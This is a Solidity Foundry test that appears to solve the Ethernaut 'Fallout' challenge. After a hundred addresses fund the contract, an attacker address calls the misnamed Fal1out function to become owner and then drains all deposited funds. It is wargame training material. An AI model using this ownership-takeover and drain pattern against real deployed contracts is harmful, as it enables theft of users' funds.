// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout/Fallout.sol";

contract FalloutTest is Test {
    Fallout fallout;
    address attacker = address(0xB0B);

    function setUp() public {
        fallout = new Fallout();
        vm.deal(attacker, 1 ether);
    }

    function test_owner() public {
        for (uint256 i = 0; i < 100; i++) {
            address addr = address(uint160(i + 1));
            vm.deal(addr, 1 ether);
            vm.prank(addr);
            fallout.allocate{value: 0.0009 ether}();
        }

        console.log("Balance Before Attack: ", address(fallout).balance);
        console.log("Owner: ", fallout.owner());

        vm.startPrank(attacker);
        fallout.Fal1out{value: 0.0009 ether}();
        fallout.collectAllocations();
        vm.stopPrank();

        assertEq(fallout.owner(), attacker);
        console.log("Balance After Attack: ", address(fallout).balance);
        console.log("New Owner Balance: ", address(fallout.owner()).balance);
        assert(address(fallout).balance == 0);
    }
}
